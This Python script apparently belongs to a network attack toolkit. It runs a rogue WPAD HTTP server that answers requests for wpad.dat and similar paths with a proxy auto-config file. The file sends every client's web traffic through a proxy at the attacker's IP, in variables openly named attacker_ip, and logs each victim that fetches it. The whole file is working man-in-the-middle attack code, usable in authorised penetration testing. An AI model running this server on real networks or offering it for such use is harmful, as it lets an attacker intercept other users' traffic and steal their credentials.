#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import conf
from termcolor import cprint

WPAD_PATHS = {'/', '/wpad.dat', '/wpad.da', '/wpad'}

def run(interface, proxy_port=8080):
    HTTP_PORT = 80
    attacker_ip = conf.ifaces[interface].ip

    wpad_content = (
        f'function FindProxyForURL(url, host) {{\n'
        f'  return "PROXY {attacker_ip}:{proxy_port}";\n'
        f'}}\n'
    ).encode()

    class WpadHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in WPAD_PATHS:
                self.send_response(200)
                self.send_header('Content-Type', 'application/x-ns-proxy-autoconfig')
                self.send_header('Content-Length', len(wpad_content))
                self.end_headers()
                self.wfile.write(wpad_content)
                cprint(f'[HTTP] Served wpad.dat to {self.client_address[0]}', 'magenta')
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, fmt, *args):
            pass  # suppress default access log noise

    cprint('*** HTTP server running ***', 'magenta', attrs=['blink', 'reverse'])
    httpd = HTTPServer((attacker_ip, HTTP_PORT), WpadHandler)
    httpd.serve_forever()
